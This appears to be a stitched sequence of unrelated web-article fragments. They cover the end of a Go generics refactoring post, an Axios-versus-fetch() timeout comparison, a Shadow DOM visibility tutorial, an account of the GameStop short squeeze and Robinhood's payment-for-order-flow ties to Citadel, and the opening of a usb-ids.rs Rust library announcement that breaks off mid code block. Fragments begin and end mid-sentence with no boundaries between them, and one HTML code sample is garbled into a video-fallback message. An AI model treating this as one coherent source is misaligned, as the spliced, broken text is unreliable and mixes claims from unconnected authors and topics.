likely already being performed by users, because their typed slice would have
to be copied to an empty interface slice prior to calling the old <code>PubSlice</code>.
If anything, it’s an improvement because it eliminates more book-keeping for
the user. Typically the conversion to <code>interface{}</code> parameters is handled by
the compiler/runtime, but not for a slice of empty interfaces.</p>
<h2 id="publisher-subscriber--context"><code>Publisher</code>, <code>Subscriber</code>, &amp; <code>Context</code></h2>
<p>With the move to type parameters for the <code>PubSub</code> type, there is no longer a
need for the old “type safe” API: the basic API now supports compile time type
safety. It’s a big improvement over the old API. The <code>Publisher</code> &amp; <code>Subscriber</code>
interfaces were deleted, along with the <code>Context</code> interface.</p>
<blockquote>
<p>n.b. <code>Context</code> was unfortunately named due to being written before the
<code>context</code> package was part of the standard library.</p>
</blockquote>
<p>I don’t think I can understate how gratifying it is to see this sort of
improvement naturally fall out from a new language feature. Deleting code
always feels good, but that hardly compares to removing leaky abstractions. At
this point the <code>Buffer</code> type could be unexported, but I held off for the sake
of keeping the diff readable.</p>
<p>The “unusable empty value” <code>Buffer</code> problem mentioned above is solved rather
trivially: because the <code>Buffer</code> of a <code>PubSub</code> is no longer exposed via the API
to users, a nil <code>cell</code> value can safely be used as the empty value,
because there is no other opportunity for a nil <code>cell</code> to be written to the
<code>Buffer</code>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I struggled to grasp generics at the outset of this experiment. They are
complex in a way that I haven’t encountered in a while with Go: I wasn’t sure
when to reach for them and when to use another feature of Go. I didn’t have a
firm understanding of “what” needed to be done until I started using the
<code>go2go</code> tool. It was difficult, but …</p></section></div>

Some industry experts argue that the request didn’t fail, so it finished successfully. This is independent from whether the server could find the resource or not. </p><p>However, it’s a significant difference to know when working with one of both libraries.</p><h2 id="comparison-how-to-timeout-a-request">Comparison: How to timeout a request?</h2><p>Having the ability to define a timeout for a request prevents your application from <em>hanging</em> requests. These hanging requests can slow down your application or cause a memory leak, and therefore, are pretty dangerous.</p><p>As indicated by <a href="https://robertovitillo.com/default-timeouts/" target="_blank" rel="noreferrer">Roberto Vitillo</a>, “Modern applications don’t crash; they hang. One of the main reasons for it is the assumption that the network is reliable. It isn’t.”</p><p>So, how do <code>fetch()</code> and Axios handle request timeouts?</p><p>First, Axios doesn’t set a default timeout. Therefore, it relies on the browser’s request timeout. In Chrome, a network request times out at 300 seconds. That’s way too long. Let’s change that using the <code>config</code> object. The example below aborts the request after a 1000 milliseconds waiting time.</p><div><pre><p><span>1</span><span>const</span><span> response </span><span>=</span><span> </span><span>await</span><span> axios</span><span>.</span><span>get</span><span>(</span><span>'https://jsonplaceholder.typicode.com/todos/1'</span><span>,</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    timeout</span><span>:</span><span> </span><span>1000</span><span></span></p><p><span>3</span><span></span><span>}</span><span>)</span><span>;</span></p></pre></div><p>For <code>fetch()</code>, there was originally <a href="https://github.com/whatwg/fetch/issues/951" target="_blank" rel="noreferrer">no way to set a timeout</a>. Luckily, we can make use of the experimental <a href="https://developer.mozilla.org/en-US/docs/Web/API/AbortController#examples" target="_blank" rel="noreferrer">Abort API</a> that supports request timeouts. Here’s an example of how to abort a request after 1000ms with <code>fetch()</code>.</p><div><pre><p><span>1</span><span>const</span><span> controller </span><span>=</span><span> </span><span>new</span><span> </span><span>AbortController</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span><span>const</span><span> fetchPromise </span><span>=</span><span> </span><span>fetch</span><span>(</span><span>'https://jsonplaceholder.typicode.com/todos/1'</span><span>,</span><span> </span><span>{</span><span> signal</span><span>:</span><span> controller</span><span>.</span><span>signal</span><span> </span><span>}</span><span>)</span><span>;</span><span>  </span></p><p><span>3</span><span> </span></p><p><span>4</span><span></span><span></span></p><p><span>5</span><span></span><span>setTimeout</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> controller</span><span>.</span><span>abort</span><span>(</span><span>)</span><span>,</span><span> </span><span>1000</span><span>)</span><span>;</span><span> </span></p><p><span>6</span><span> </span></p><p><span>7</span><span>fetchPromise</span><span>.</span><span>then</span><span>(</span><span>response</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>    </span><span></span></p><p><span>9</span><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>response</span><span>)</span><span></span></p><p><span>10</span><span></span><span>}</span><span>)</span></p></pre></div><p>Note how we use the <code>AbortController</code> and pass the abort signal via our <code>config</code> object to the <code>fetch()</code> method. Once the <code>setTimeout()</code> timer runs out, it will call the <code>abort()</code> method on the controller object. This abort call will send the abort signal to our <code>fetch()</code> call.</p><p>Again, <code>fetch()</code> opts for a more lengthy workaround to implement a timeout for requests.</p><h2 id="conclusion">Conclusion</h2><p>Axios provides a more comfortable to use API in comparison with <code>fetch()</code>. The most significant disadvantage of using <code>fetch()</code> is the verbose workaround to set a timeout for your request. It’s a much-needed functionality to prevent hanging requests. </p><p>On the other hand, remember that Axios sets the default timeout to zero. Therefore, don’t forget to set a timeout for each request. Alternatively, you can use a request interceptor to automatically set the request timeout.</p><p>Furthermore, for Node.js especifically, automatic JSON parsing is a useful feature to keep your code clean. Again, you can use an interceptor for the Fetch API to parse a response object automatically to JSON. </p><p>Yet, as seen in this guide, we have to overwrite the <code>fetch()</code> method to add custom logic. I think it adds complexity to your code. For that reason, Axios is a clear winner to send HTTP requests based on its simplicity and ease-of-use.</p><h2 id="frontend-monitoring">Frontend Monitoring</h2><p>Debugging a web application in production may be challenging and time consuming. Asayer is a frontend monitoring tool that replays everything your users do and shows how your app behaves for every issue. It’s like having your browser’s inspector open while looking over your user’s shoulder.
Asayer lets you reproduce issues, aggregate JS errors and monitor your app’s performance. Asayer offers plugins for capturing the state of your <em>Redux or VueX</em> store and for inspecting <em>Fetch</em> requests and <em>GraphQL</em> queries.

		<p>The other day I was thinking about what do HTML tags give us out of the box and made this list:</p>
<ol>
<li><strong>Hierarchy</strong></li>
</ol>
<pre><code data-lang="html"><span>&lt;</span><span>luke-im-your-father</span><span>&gt;

    Sorry, your browser doesn't support embedded videos.

</span></code></pre>
<p>This list is by no means exhaustive. There are likely many more things that HTML tags give us (like headaches, reactjs, and some money at the end of the month if we are lucky).</p>
<p>With the Shadow DOM it is possible to compose all of the features above and hide them away inside custom tags.</p>
<p>I want to use Shadow DOM like a rug that I can sweep tags under it. A particular DOM root that cannot be seen and that is under the control of a tag.</p>

<pre><code data-lang="html"><span>&lt;</span><span>nevermind-the-backend-this-is-where-the-dragons-are</span><span>&gt;

</span><span>&lt;!-- there is nothing to see here because this tag has a Shadow root --&gt;

</span><span>&lt;/</span><span>nevermind-the-backend-this-is-where-the-dragons-are</span><span>&gt;
</span></code></pre>
<p>This DOM root inception made me wonder: <em>"What is the default visibility behavior of the Shadow DOM? could it be reversed?"</em></p>

<h2 id="hmm-that-sounds-stupid-but-how-would-it-work">Hmm, that sounds stupid, but how would it work?</h2>
<p>When a Web Component has no shadow root, it will happily render all its children:</p>
<pre><code data-lang="html"><span>&lt;</span><span>html</span><span>&gt;&lt;</span><span>body</span><span>&gt;

&lt;</span><span>simple-web-component</span><span>&gt;
    &lt;</span><span>p</span><span>&gt;Hello world! I am not inside the shadow root.&lt;/</span><span>p</span><span>&gt;
&lt;/</span><span>simple-web-component</span><span>&gt;

&lt;</span><span>script</span><span>&gt;

</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>simple-web-component</span><span>",
</span><span>// What follows is the the &lt;simple-web-component&gt; code:
</span><span>class extends </span><span>HTMLElement </span><span>{
    </span><span>initialize</span><span>() {
      </span><span>// Nothing for now... just a simple component
    </span><span>}

    </span><span>// Call initialize when added to a parent node
    </span><span>connectedCallback</span><span>() { </span><span>this</span><span>.</span><span>initialize</span><span>(); }
}</span><span>);

&lt;/</span><span>script</span><span>&gt;

&lt;/</span><span>body</span><span>&gt;&lt;/</span><span>html</span><span>&gt;
</span></code></pre>
<p>The code above creates the functionality for the <code>&lt;simple-web-component&gt;</code> tag. Which gets rendered as expected:</p>
<p><img src="https://hugodaniel.com/images/no-shadow-dom.png" alt="A portion of a browser window, showing the following text in black letters &quot;Hello world! I am not inside the shadow root&quot;, in a white background." title="In direct sunlight"></p>
<p>However, this is not how it behaves when a shadow root is added to it.</p>
<h3 id="adding-a-bare-shadow-root">Adding a bare shadow root</h3>
<p>The code inside the <code>&lt;script&gt;</code> tag needs to be slightly adjusted to add a shadow root.</p>
<pre><code data-lang="javascript"><span>customElements</span><span>.</span><span>define</span><span>("</span><span>simple-web-component</span><span>",

</span><span>// The &lt;simple-web-component&gt; code:
</span><span>class extends </span><span>HTMLElement </span><span>{
    
    </span><span>root </span><span>= </span><span>this</span><span>.</span><span>attachShadow</span><span>({mode: </span><span>'</span><span>open</span><span>'</span><span>})
    
    </span><span>initialize</span><span>() </span><span>{
        </span><span>const </span><span>p </span><span>= </span><span>document.</span><span>createElement</span><span>(</span><span>"</span><span>p</span><span>"</span><span>);
        </span><span>p</span><span>.</span><span>textContent </span><span>= "</span><span>In the shadow!</span><span>"</span><span>;
        </span><span>this</span><span>.</span><span>root</span><span>.</span><span>append</span><span>(</span><span>p</span><span>);
    }

    </span><span>// Call initialize when added to a parent node
    </span><span>connectedCallback</span><span>() </span><span>{ </span><span>this</span><span>.</span><span>initialize</span><span>(); }
}</span><span>);

</span></code></pre>
<p>The <code>&lt;simple-web-component&gt;</code> class now has a <code>root</code> attribute <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow">set with its shadow root</a>. Then a simple <code>&lt;p&gt;In the shadow!&lt;/p&gt;</code> is placed inside it by the <code>initialize()</code> function.</p>
<p>This simple shadow root will affect the display of the component.</p>
<p>The previous <code>&lt;p&gt;Hello world! I am not inside the shadow root.&lt;/p&gt;</code> will no longer be shown since it is outside the shadow root, and now only the shadow root contents are being displayed.</p>
<p><img src="https://hugodaniel.com/images/with-shadow-dom.png" alt="A portion of a browser window, showing the following text in black letters &quot;In the shadow!&quot; in a white background." title="Shaded"></p>
<p>However, the inspector tools shows how the tag is really juggling the shadow dom:</p>
<p><img src="https://hugodaniel.com/images/shadow-dom-inspector.png" alt="The hierarchy of tags as seen by the inspector tools. Under the &quot;simple-web-component&quot; tag, there is a &quot;#shadow-root&quot; tag with a single &quot;p&quot; tag with the text &quot;In the shadow!&quot;. Also, under the &quot;simple-web-component&quot; another &quot;p&quot; tag can be seen with the content &quot;Hello world! I am not inside the shadow root.&quot;" title="This shadow is not for everyone"></p>
<p>Looking at the above hierarchy it is worth noting that the original <code>&lt;p&gt;Hello World!..&lt;/p&gt;</code> is still there, but <em>why is it not visible?</em></p>
<p>Once a shadow root is added to a tag, it becomes the thing that will get rendered. Shadow DOM is the authority, everything else is discarded, and only the stuff inside the shadow root gets displayed.</p>
<p><em>Why?</em></p>
<p>Because the idea was that whatever children a custom tag would have could get rendered with ninja tricks inside the shadow. Thus giving the impression that the custom tag was getting its input from its visible children and then performing hidden layout and style foojitsu on that input (such tricks would occur inside the shadow dom - hidden from the written HTML).</p>
<p>Nobody cares. In fact, let me revert this logic.</p>
<h2 id="you-wouldn-t-download-a-car">You wouldn't download a car</h2>
<p>The first step to revert the Shadow DOM is to copy all the custom components' children into its shadow root.</p>
<p>This will allow HTML to be rendered as expected while maintaining the Shadow DOM's encapsulation features.</p>
<p>Luckily the Web Components spec provides just the feature for this, through the <code>&lt;slot&gt;</code> tag.</p>
<h3 id="i-m-such-a-slot">I'm such a <code>&lt;slot&gt;</code></h3>
<p>This tag is used mainly in HTML <code>&lt;template&gt;</code>'s. It is the way that <code>&lt;template&gt;</code>'s have to tell which parts can be set by outsiders. Typically <code>&lt;slot&gt;</code>'s have a name attribute to be used as the reference to where the content will go. (You can see an <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/slot#attributes">example of it here</a>, but it is not necessary, I won't be using it.)</p>
<p>The cool thing is that if there is no <code>name</code> specified on the <code>&lt;slot&gt;</code>, then it becomes the default <code>&lt;slot&gt;</code> where all unspecified content will go in.</p>
<p>This is perfect. It means that if a <code>&lt;slot&gt;</code> is placed inside the shadow root (without a <code>name="..."</code> attribute), then all of the custom element children will automatically be copied into it.</p>
<pre><code data-lang="html"><span>&lt;</span><span>html</span><span>&gt;&lt;</span><span>body</span><span>&gt;

&lt;</span><span>simple-web-component</span><span>&gt;
    &lt;</span><span>p</span><span>&gt;Hello world! I am not inside the shadow root.&lt;/</span><span>p</span><span>&gt;
&lt;/</span><span>simple-web-component</span><span>&gt;

&lt;</span><span>script</span><span>&gt;
</span><span>customElements</span><span>.</span><span>define</span><span>("</span><span>simple-web-component</span><span>",

</span><span>// The &lt;simple-web-component&gt; code:
</span><span>class extends </span><span>HTMLElement </span><span>{
    
    </span><span>root </span><span>= </span><span>this</span><span>.</span><span>attachShadow</span><span>({mode: </span><span>'</span><span>open</span><span>'</span><span>})
    
    </span><span>initialize</span><span>() {
        </span><span>const </span><span>p </span><span>= </span><span>document.</span><span>createElement</span><span>(</span><span>"</span><span>p</span><span>"</span><span>);
        </span><span>p</span><span>.textContent </span><span>= "</span><span>In the shadow!</span><span>"</span><span>;

        </span><span>this</span><span>.root.</span><span>append</span><span>(
          </span><span>p</span><span>,
          document.</span><span>createElement</span><span>(</span><span>"</span><span>slot</span><span>"</span><span>)
        );
    }

    </span><span>// Call initialize when added to a parent node
    </span><span>connectedCallback</span><span>() { </span><span>this</span><span>.</span><span>initialize</span><span>(); }
}</span><span>);
&lt;/</span><span>script</span><span>&gt;

&lt;/</span><span>body</span><span>&gt;&lt;/</span><span>html</span><span>&gt;
</span></code></pre>
<p>The Shadow Root above will contain a single <code>&lt;slot&gt;</code> tag. This makes the <code>&lt;p&gt;Hello world! I am not inside the shadow root.&lt;/p&gt;</code> show up when the tag is rendered.</p>
<p><img src="https://hugodaniel.com/images/with-slot.png" alt="A portion of a browser window, showing two lines of text. The first one has the phrase &quot;In the shadow!&quot; and the second line has the phrase &quot;Hello world! I am not inside the shadow root.&quot;. Both of them have black letters on a white background." title="Both visible"></p>
<h2 id="don-t-ask-don-t-tell">Don't ask, don't tell</h2>
<p>The second step to revert the Shadow DOM display is to only show the children of the element.</p>
<p>Hide everything that is outside the <code>&lt;slot&gt;</code>. Only the tag's original children must be visible, while all the other shadow root contents must be hidden.</p>
<p>To achieve it, the following CSS is added to the Shadow DOM:</p>
<pre><code data-lang="css"><span>:</span><span>not(slot) </span><span>{
    display: none;
}
</span></code></pre>
<p>The common practice is to create a <code>&lt;style&gt;</code> tag, place the above content inside it and then append the <code>&lt;style&gt;</code> tag to the Shadow DOM:</p>
<pre><code data-lang="javascript"><span>    </span><span>initialize</span><span>() {
        </span><span>const </span><span>p </span><span>= document.</span><span>createElement</span><span>("</span><span>p</span><span>");
        </span><span>p</span><span>.</span><span>textContent </span><span>= "</span><span>In the shadow!</span><span>";

        </span><span>const </span><span>style </span><span>= document.</span><span>createElement</span><span>("</span><span>style</span><span>");
        </span><span>style</span><span>.</span><span>textContent </span><span>= `
</span><span>        :not(slot) {
          display: none;
        }</span><span>`;

        </span><span>this</span><span>.</span><span>root</span><span>.</span><span>append</span><span>(
          </span><span>style</span><span>,
          </span><span>p</span><span>,
          document.</span><span>createElement</span><span>("</span><span>slot</span><span>")
        );
    }
</span></code></pre>
<p>And just like that, the actual behavior of the Shadow DOM is reversed. The Shadow DOM contents are hidden by default, while the original custom tag children get rendered by default.</p>

<p>No "In the shadow!" text is visible.</p>
<h2 id="conclusion">Conclusion</h2>
<p>It is possible to sweep all kinds of useless trash under the Shadow DOM.</p>
<p>However, it might require reversing the Shadow DOM's visibility (which is rendered by default).</p>
<p>To achieve it, a full copy of the custom element original children is made into the Shadow DOM (through the default <code>&lt;slot&gt;</code> tag). The next step is to hide everything inside the Shadow DOM that does not belong to the original children.</p>
<p>With these two moves, the element's original children become visible while leaving all the other shadow DOM contents invisible.</p>

By close today, it had reached $364.15. An intense buzz has formed in the stock thanks to discussion on the Reddit forum Wall Street Bets, further enhanced by dominant coverage in the media. At least one hedge fund, Melvin Capital, that was shorting GameStop (betting the price would fall) got <a href="https://www.bloomberg.com/news/articles/2021-01-27/melvin-capital-closes-out-its-gamestop-position-cnbc-reports">utterly crushed</a>.</p><figure><img src="https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-6.52.14-PM.png" alt="" srcset="https://marketsweekly.ghost.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-27-at-6.52.14-PM.png 600w, https://marketsweekly.ghost.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-27-at-6.52.14-PM.png 1000w, https://marketsweekly.ghost.io/content/images/size/w1600/2021/01/Screen-Shot-2021-01-27-at-6.52.14-PM.png 1600w, https://marketsweekly.ghost.io/content/images/size/w2400/2021/01/Screen-Shot-2021-01-27-at-6.52.14-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Some cheered the victory of Reddit and Robinhood over Wall Street.</p><p>But it isn't so simple.</p><!--kg-card-begin: markdown--><p>(If you'd like to skip the explanation and <a href="#questions">jump to my suggestions for the future, go here.</a>)</p>
<!--kg-card-end: markdown--><p>This mania started when a popular Reddit forum called Wall Street Bets began writing about some of the most "shorted" retail stocks. </p><blockquote>You can bet that the price of a stock will <em>fall</em> by taking on a short position. This requires you to <strong>borrow the stock </strong>from someone else first. Your broker then immediately sells the stock. Since you think the price will fall further, you're calm, cool, and collected. You wait to the price to fall more, and then you buy the stock <strong>back</strong> at a lower price, so you can return the shares to whoever you borrowed it from. </blockquote><p>Wall Street Bets publicly hatched a plan on the forum to buy and <strong>hold </strong>GameStop stock, and GameStop call options, in order to drive the price up so high, it would create a "short squeeze." A "short squeeze" is when a price jumps so high that the short sellers are forced to buy <em>back </em>the stock to close out their position (usually due to their broker requiring them to put up more cash because they're losing money so fast. This is a "margin call"). </p><p>All the attention and momentum from the press brought in more retail traders buying GameStop, and Wall Street itself hopped in for the ride. So many people buying call options also caused the people <em>selling</em> the Robinhood crowd those options to buy the stock in order to "hedge" their bets. </p><blockquote>One of the byproducts of both Robinhood and Wall Street Bets has been the popularization of trading options by retail traders. </blockquote><blockquote>A stock option is a derivative that gives you the <strong>right</strong> to buy or sell 100 shares of stock in the <strong>future</strong> at a set price. The price you have the right to buy or sell it at is the "strike price." The option has an <strong>expiration </strong>date. It also can be either a Call option (which gives you the right to buy the stock) or a Put option (which gives you the right to sell it). </blockquote><p>When you buy a Call option from a market maker, if that market maker doesn't already own the stock, they have to hedge their bet by buying the stock. So not only did you have all of these people on Robinhood buying GameStop stock, many were also buying GameStop call options. That meant the market makers on Wall Street were <strong><em>also</em></strong> buying GameStop stock in order to hedge their position.</p><p>It's worth noting that since the start of the pandemic, there's actually been a monumental <a href="https://markets.businessinsider.com/news/stocks/stock-market-outlook-retail-investing-shorts-trading-options-deutsche-bank-2021-1-1030005344">increase</a> in retail traders buying call options:</p><figure><img src="https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-7.58.10-PM.png" alt="" srcset="https://marketsweekly.ghost.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-27-at-7.58.10-PM.png 600w, https://marketsweekly.ghost.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-27-at-7.58.10-PM.png 1000w, https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-7.58.10-PM.png 1230w" sizes="(min-width: 720px) 720px"></figure><p>All of this drove the price of GameStop into the stratosphere.</p><p>We know that many Robinhood and Redditors are profiting off this. But they aren't the only ones. </p><h3 id="citadel-pays-for-order-flow-from-robin-hood-">Citadel pays for order flow from Robin Hood. </h3><p>Citadel is a massive hedge fund (founded by billionaire Ken Griffin) with three different firms: a tech firm, an asset manager, and a market maker. The market maker, <strong>Citadel Securities</strong>, pays Robinhood a pre-set fee for every trade they execute. &nbsp;(It's worth noting that Citadel isn't just <em>any </em>market maker. They're massive: handling <a href="https://www.bloomberg.com/news/articles/2020-02-25/citadel-securities-expands-an-already-dominant-options-business?sref=f7rH2jWS">almost a quarter</a> of all listed (aka, exchange-traded) stock options.)</p><p>This is what's called a <strong>Payment for Order Flow (PFOF) </strong>arrangement.</p><p>Market markers can profit from these arrangements in a few different ways (read more <a href="https://centerpointsecurities.com/payment-for-order-flow-guide/">here</a> if you want the full details). But the best way to summarize it is this: Citadel can batch the Robinhood orders together, leverage its sophisticated high-frequency trading (HFT) algorithms to "front run" (buy shares "in front of" or before your client does) Robinhood trades. </p><p>Robinhood traders are generally not buying or selling options in "lots" (batches of 100); they're usually buying one or two or ten options at a time. So Citadel may batch a number of Robinhood users' options together, buy multiple "lots" themselves from another dealer, then fill the batch of Robinhood orders at a slightly worse price that what Citadel paid for it. </p><figure><img src="https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-7.29.46-PM.png" alt="" srcset="https://marketsweekly.ghost.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-27-at-7.29.46-PM.png 600w, https://marketsweekly.ghost.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-27-at-7.29.46-PM.png 1000w, https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-7.29.46-PM.png 1566w" sizes="(min-width: 720px) 720px"><figcaption>Image via<a href="https://centerpointsecurities.com/payment-for-order-flow-guide/"> Center Point Securities</a></figcaption></figure><p>Historically, there's been debate about whether or not Payment for Order Flow should even be allowed. The practice was actually originated by none other than Bernie Madoff (the famous ponzi scheme fraudster) in the 1980s. During the Obama administration, the SEC asked one of its market advisory commitees if Payment for Order Flow <a href="https://www.sec.gov/spotlight/equity-market-structure/issues-affecting-customers-emsac-012616.pdf">should be banned</a>. </p><p>Citadel has also gotten into trouble with the SEC in the past for the way it handled its Payment for Order Flow: In 2017, they <a href="https://www.bloomberg.com/news/articles/2017-01-13/citadel-unit-to-pay-22-6-million-in-sec-settlement-over-trades">fined</a> Citadel Securities $22.6 million, "saying the firm inaccurately described how it handled trades placed by small investors," according to <a href="https://www.bloomberg.com/quicktake/payment-for-order-flow">Bloomberg</a>.</p><p>Some, like Institutional Investor magazine (a major Wall Street trade publication) have asked, essentially "who cares?" They <a href="https://www.institutionalinvestor.com/article/b1m2p1cv68bx56/Twitter-Freaked-Out-Over-Robinhood-Selling-Its-Trade-Flow-But-the-App-and-Others-Have-Been-Doing-It-for-Years">noted in June 2020</a> that "payment-for-order-flow is nothing new" and that the practice is used by "<a href="https://capitalmarkets.fidelity.com/app/literature/item/9886428.html">Fidelity</a>, <a href="https://content.etrade.com/etrade/powerpage/pdf/OrderRouting11AC6.pdf">e*Trade</a>, <a href="https://content.schwab.com/drupal_dependencies/psr/606/final.pdf">Charles Schwab</a>, and <a href="https://www.tdameritrade.com/retail-en_us/resources/606_disclosure/tdainc-TDA2055-q1-2020.pdf">TD Ameritrade</a>, among others, SEC Rule 606 disclosures show." </p><p>But unlike the other firms that use this technique—Robinhood <strong>doesn’t publish data</strong> on how much price improvement it gives customers.</p><p>Not only that, but Robinhood wasn't initially honest about this arrangement:</p><ul><li>In December 2020, the SEC charged Robinhood with <a href="https://www.sec.gov/news/press-release/2020-321">failing to disclose</a> that it was using this Payment for Order Flow model at all. The SEC also found that Robinhood was failing to provide "best execution" to its clients, thus <strong>costing them over $34 million</strong> due to "inferior trade prices," even when you factored in zero commissions. </li><li>Even FINRA, Wall Street's <em>self-regulating</em> overseer, also <a href="https://www.finra.org/media-center/newsreleases/2019/finra-fines-robinhood-financial-llc-125-million-best-execution">fined Robinhood in 2019</a> for “best execution violations related to its customers’ equity orders and related supervisory failures.” Robinhood paid a $1.25 million fine, but did not admit or deny any wrongdoing.</li></ul><blockquote>Robinhood is a broker, and as such, is obligated to provide its clients with "best execution" on their trade. This means the broker must put their clients' interests first, and try and get either the best price or fastest execution, and not send their orders to the market maker paying them the best price for order flow. </blockquote><h3 id="citadel-is-the-dominant-market-maker-used-by-robinhood">Citadel is the dominant Market Maker Used by Robinhood</h3><p>Citadel is not the <em>only </em>market maker that Robinhood uses, but it's the largest one. It accounts for the majority of its stock executions, and more than 55% of its equity option executions, <a href="https://cdn.robinhood.com/assets/robinhood/legal/RHS%20SEC%20Rule%20606a%20and%20607%20Disclosure%20Report%20Q3%202020.pdf">as of July 2020</a>:</p><figure><img src="https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-6.34.25-PM.png" alt="" srcset="https://marketsweekly.ghost.io/content/images/size/w600/2021/01/Screen-Shot-2021-01-27-at-6.34.25-PM.png 600w, https://marketsweekly.ghost.io/content/images/size/w1000/2021/01/Screen-Shot-2021-01-27-at-6.34.25-PM.png 1000w, https://marketsweekly.ghost.io/content/images/size/w1600/2021/01/Screen-Shot-2021-01-27-at-6.34.25-PM.png 1600w, https://marketsweekly.ghost.io/content/images/2021/01/Screen-Shot-2021-01-27-at-6.34.25-PM.png 2122w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://cdn.robinhood.com/assets/robinhood/legal/RHS%20SEC%20Rule%20606a%20and%20607%20Disclosure%20Report%20Q3%202020.pdf" rel="noopener">Robinhood Securities SEC Rule 606 and 607 Disclosure</a>, July 2020</figcaption></figure><p><strong><em>Sidebar: What's a market marker?</em></strong></p><blockquote>Market makers are the people who sit as intermediaries between buyers and sellers. When you want to buy, they're there to sell to you. When you want to sell, they stand ready to buy. They make money off of the "flow," and they carefully hedge all the positions they take on in order to manage the risk of their portfolio. </blockquote><h3 id="robinhood-citadel-melvin-capital-and-point72">Robinhood, Citadel, Melvin Capital, and Point72</h3><p>So Citadel is a hedge fund whose Market Making arm is handling the majority of Robinhood orders. Meanwhile, another hedge fund, Melvin Capital, was one of the funds caught in the GameStop short squeeze. This week, they finally had enough, and had to close out their short position for a big loss. </p><p>Who stepped in to buy up a piece of Melvin Capital after that happened? </p><p>None other than Citadel Securities' parent, Citadel LLC. The WSJ <a href="https://www.wsj.com/articles/citadel-point72-to-invest-2-75-billion-into-melvin-capital-management-11611604340">reported on Monday</a>:</p><blockquote>Citadel LLC and Point72 Asset Management are investing $2.75 billion in hedge fund Melvin Capital Management, an emergency influx of cash that is expected to stabilize what has been one of the top performing funds on Wall Street.</blockquote><p>Who's the other party that gave cash to Melvin Capital? Point72, the new investment advisory firm for Steve Cohen. Cohen's former hedge fund SAC Capital, the firm that <a href="https://dealbook.nytimes.com/2013/11/04/after-a-decade-sac-capital-blinks/">pled guilty to insider trading</a> in 2013 (though Cohen himself emerged without admitting guilt). It's also worth noting that Melvin Capital is run by Gabriel Plotkin, who was one of SAC capital's top traders. Cam Karsan has some <a href="https://twitter.com/jam_croissant/status/1353991973342998528">further thoughts</a> on the Citadel/Point72 rescue of Melvin <a href="https://twitter.com/jam_croissant/status/1353991973342998528">here</a>.</p><h3 id="wall-street-loves-data">Wall Street Loves Data</h3><p>It's important to remember that Wall Street is a data machine. Wall Street will use data from every avenue it can to try to make predictions about what is going to happen next in the market. They hoover up data to feed their models, in order to make valuation decisions, and in order to arrive at what is the best most accurate price of something. I remember one of the traders that I used to work with used to pull up every lot of different news sources including the Drudge Report, which I thought was ridiculous. But he said, "look, I want to get news from every place I can and I want to understand what people from all different kinds of points of view are thinking." Traders seek information and rumors and tips like heat-seeking missiles. </p><p>Usually, traders use expensive vendors to supply them with quotes to feed into their models. Some of those quotes come from financial intermediaries (called "inter-dealer brokers") whose only purpose in life is to mask the orders of the big banks, so they can trade with each other with some degree of anonymity. (I learned in my time on Wall Street that with enough pressure, some inter-dealer brokers would admit who was on the other side of the trade).</p><p>Wall Street loves data, but they also loathe other people finding out their data and their order flow.

<p>This is just a brief announcement for a Rust library that I wrote last month:
<em><a href="https://github.com/woodruffw/usb-ids.rs">usb-ids.rs</a></em>.</p>

<p>It’s available on <a href="https://crates.io/crates/usb-ids">crates.io</a>; read on if you’re interested
in the motivation and implementation.</p>

<h2 id="background">Background</h2>

<p><a href="https://en.wikipedia.org/wiki/USB">Universal Serial Bus</a>, or USB,
is a family of standards that governs both physical form factors and communication protocols for
the vast majority of peripheral devices on modern computers.</p>

<p>In addition to their actual peripheral functionality, USB devices expose a wide variety of
both generic and device-specific metadata to their connected host. This metadata is used
to advertise the peripheral’s capabilities (e.g., resolutions for a webcam) as well as
uniquely<sup id="fnref:uniquely" role="doc-noteref"><a href="#fn:uniquely">1</a></sup> identify the peripheral to both the machine (device and product IDs) and
to humans (device and product strings).</p>

<p>The latter is particularly important: humans don’t remember pairs of 16-bit integers very well,
so they need friendly strings like <code>"Logitech BRIO"</code> to identify devices for management.</p>

<p>Let’s see what it looks like to ask each USB device for its human-readable identifiers,
using <a href="https://github.com/libusb/libusb"><code>libusb</code></a> by way of Rust’s
<a href="https://github.com/a1ien/rusb"><code>rusb</code></a>:</p>

Error: Access

<p>Oh no! What happened?</p>

<p>As it turns out, letting random unprivileged users directly connect to arbitrary USB devices is a
no-no on most Linux distributions<sup id="fnref:others" role="doc-noteref"><a href="#fn:others">2</a></sup>: users are expected to interact with most peripherals
through a specialized kernel driver or subsystem, like <code>uvcvideo</code> for USB webcams or
<a href="https://en.wikipedia.org/wiki/Advanced_Linux_Sound_Architecture">ALSA</a> for audio.</p>

<p>To get direct access to USB devices, we need to enter the world of
<a href="https://en.wikipedia.org/wiki/Udev"><code>udev</code></a> rules. We can either write a targeted rule:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>SUBSYSTEM</span>==<span>"usb"</span>, <span>ATTRS</span>{<span>idVendor</span>}==<span>"acab"</span>, <span>ATTRS</span>{<span>idProduct</span>}==<span>"acab"</span>, <span>MODE</span>=<span>"0666"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>…or a general rule, exposing the entire USB subsystem to all unprivileged users:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
